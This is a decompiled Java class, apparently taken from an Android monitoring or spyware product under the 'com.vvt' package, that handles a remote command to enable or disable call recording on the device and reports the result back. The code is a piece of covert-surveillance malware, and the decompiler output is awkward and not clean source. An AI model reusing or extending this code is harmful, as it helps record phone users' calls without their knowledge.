package com.vvt.remotecommand.processor.d;

import com.vvt.remotecommand.RemoteCommand;
import com.vvt.remotecommand.exception.InvalidCommanFormatException;
import com.vvt.remotecommand.exception.RemoteCommandException;
import com.vvt.remotecommand.processor.RemoteCommandProcessor;
import com.vvt.remotecommand.processor.RemoteCommandProcessor.QueueCategory;
import com.vvt.remotecommand.processor.c;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.output.RmtCtrlOutputEnableCallRecording;
import java.util.ArrayList;
import java.util.Iterator;

public class b
  extends RemoteCommandProcessor
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.d;
  
  public b(com.vvt.remotecontrol.a parama)
  {
    super(parama);
  }
  
  public void a(RemoteCommand paramRemoteCommand, c paramc)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = paramRemoteCommand.getParameters();
    a((ArrayList)localObject1);
    int i = 0;
    Object localObject2 = null;
    localObject1 = (String)((ArrayList)localObject1).get(0);
    int k = Integer.parseInt((String)localObject1);
    bool1 = a;
    if (bool1) {}
    bool1 = a;
    if (bool1) {}
    localObject1 = h();
    localObject2 = new com/vvt/remotecontrol/ControlCommand;
    RemoteFunction localRemoteFunction = RemoteFunction.ENABLE_CALL_RECORDING;
    Integer localInteger = Integer.valueOf(k);
    ((ControlCommand)localObject2).<init>(localRemoteFunction, localInteger);
    boolean bool2 = a;
    if (bool2) {}
    localObject2 = ((com.vvt.remotecontrol.a)localObject1).execute((ControlCommand)localObject2);
    if (paramc != null)
    {
      bool1 = localObject2 instanceof RmtCtrlOutputEnableCallRecording;
      if (bool1)
      {
        localObject1 = localObject2;
        bool2 = ((RmtCtrlOutputEnableCallRecording)localObject2).isSuccess();
        localObject1 = localObject2;
        localObject1 = (RmtCtrlOutputEnableCallRecording)localObject2;
        boolean bool3 = ((RmtCtrlOutputEnableCallRecording)localObject1).isWarning();
        bool1 = a;
        if (bool1) {}
        bool1 = a;
        if ((bool1) && (!bool2)) {
          break label326;
        }
        localObject1 = "Call recording is ";
        i = 1;
        if (k != i) {
          break label288;
        }
        localObject2 = new java/lang/StringBuilder;
        ((StringBuilder)localObject2).<init>();
        localObject1 = ((StringBuilder)localObject2).append((String)localObject1);
        localObject2 = "enabled.";
        localObject1 = (String)localObject2;
        if (bool3)
        {
          localObject2 = new java/lang/StringBuilder;
          ((StringBuilder)localObject2).<init>();
          localObject1 = ((StringBuilder)localObject2).append((String)localObject1);
          localObject2 = "\nWatch notification is not set.";
          localObject1 = (String)localObject2;
        }
        paramc.b(paramRemoteCommand, this, (String)localObject1);
      }
    }
    for (;;)
    {
      bool1 = a;
      if (bool1) {}
      return;
      label288:
      localObject2 = new java/lang/StringBuilder;
      ((StringBuilder)localObject2).<init>();
      localObject1 = ((StringBuilder)localObject2).append((String)localObject1);
      localObject2 = "disabled.";
      localObject1 = (String)localObject2;
      break;
      label326:
      localObject2 = (RmtCtrlOutputEnableCallRecording)localObject2;
      localObject1 = ((RmtCtrlOutputEnableCallRecording)localObject2).getMessage();
      i = b;
      if (i != 0) {}
      i = b;
      if ((i == 0) || (localObject1 != null))
      {
        int j = ((String)localObject1).length();
        if (j > 0)
        {
          localObject2 = new com/vvt/remotecommand/exception/RemoteCommandException;
          ((RemoteCommandException)localObject2).<init>((String)localObject1);
          paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject2);
          continue;
        }
      }
      localObject1 = new com/vvt/remotecommand/exception/RemoteCommandException;
      localObject2 = "Unknown.";
      ((RemoteCommandException)localObject1).<init>((String)localObject2);
      paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject1);
    }
  }
  
  void a(ArrayList paramArrayList)
  {
    int i = 1;
    boolean bool1 = a;
    if (bool1) {}
    int j = paramArrayList.size();
    boolean bool2;
    Object localObject1;
    if (j != i)
    {
      bool2 = a;
      if (bool2) {}
      localObject1 = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      ((InvalidCommanFormatException)localObject1).<init>();
      throw ((Throwable)localObject1);
    }
    try
    {
      Iterator localIterator = paramArrayList.iterator();
      for (;;)
      {
        bool2 = localIterator.hasNext();
        if (!bool2) {
          break;
        }
        localObject1 = localIterator.next();
        localObject1 = (String)localObject1;
        Integer.parseInt((String)localObject1);
      }
      bool2 = false;
    }
    catch (NumberFormatException localNumberFormatException)
    {
      localObject2 = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      ((InvalidCommanFormatException)localObject2).<init>();
      throw ((Throwable)localObject2);
    }
    Object localObject2 = null;
    localObject2 = paramArrayList.get(0);
    localObject2 = (String)localObject2;
    int k = Integer.parseInt((String)localObject2);
    if ((k != 0) && (k != i))
    {
      boolean bool3 = a;
      if (bool3) {}
      localObject2 = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      ((InvalidCommanFormatException)localObject2).<init>();
      throw ((Throwable)localObject2);
    }
  }
  
  public RemoteCommandProcessor.QueueCategory d()
  {
    return RemoteCommandProcessor.QueueCategory.MAIN;
  }
  
  public String e()
  {
    return "Enable call recording";
  }
  
  public boolean f()
  {
    return true;
  }
  
  public long g()
  {
    return 0L;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/d/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */